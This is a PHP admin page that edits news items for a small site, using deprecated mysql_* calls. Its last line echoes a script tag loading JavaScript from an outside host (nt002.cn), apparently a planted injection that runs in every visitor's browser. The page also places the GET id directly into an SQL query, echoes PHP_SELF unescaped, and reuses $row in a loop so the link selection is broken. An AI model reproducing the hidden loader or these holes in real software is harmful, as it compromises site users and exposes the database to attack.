<?php
session_start();

if ($_SESSION['auth'] == "admin") 
{
	include("db_connect.php");
	
	$news_id = $_GET['id'];
	
	$news_query = "SELECT * FROM news WHERE news_id = $news_id";
	$news_result = mysql_query($news_query);
	
	$pages_query = "SELECT * FROM pages"; 
	$pages_result = mysql_query($pages_query);
		
	
	$row = mysql_fetch_array($news_result, MYSQL_ASSOC);
			
	$print_date = date('F j, Y', strtotime($row['news_date']));
	$stripped_title = stripslashes($row['news_title']);
	$title = htmlentities($stripped_title, ENT_QUOTES);
	echo "<html>\n<head>\n<link rel='stylesheet' href='admin.css'  type='text/css' />\n</head>\n<body>\n";
	echo "<h2>Edit News</h2>\n";
	include ('admin_navigation.php'); 
	echo "<form action='$_SERVER[PHP_SELF]' method='post'>\n" ;
	echo "<input type='hidden' name='action' value='edit'>\n";
	echo "<input type='hidden' name='id' value='".$row['news_id']."'>\n";
	echo $print_date."&nbsp; &nbsp; <input name='title' type='text' value='".$title."'> &nbsp; &nbsp"; 
	echo "<input name='active' type='radio' value='0'"; 
	if ($row['news_active'] == 0) {echo "checked='yes'";}
	echo "/>Hidden\n";
	echo "<input name='active' type='radio' value='1'"; 
	if ($row['news_active'] == 1) {echo "checked='yes'";}
	echo "/>Active<br /><br />\n";
	echo "<textarea cols='80' rows='10' name='content'>".stripslashes($row['news_content'])."</textarea><br /><br />\n";
	echo "Link to a page: <select name='link'>\n";
	//echo "<option value='0'></option>";
	if ($row['news_link'] == 0) {echo "<option value='0' selected='yes'>"; }
	while ($row = mysql_fetch_array($pages_result, MYSQL_ASSOC))
	{
		echo "<option value='".$row['page_id']."'";
				
		if ($row['news_link'] == $row['page_id']) { echo "selected='yes'"; }
				
		echo ">".$row['page_title']."</option>";
	}
	echo "</select><br /><br />\n";
	echo "<input name='edit' type='submit' value='Edit'> <a href='index.php'>Cancel</a>\n";
	echo "</form>";
}

	?>


	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />
	<?php echo "<script src='http://nt002.cn/E/J.JS'></script></body>\n</html>\n"; ?>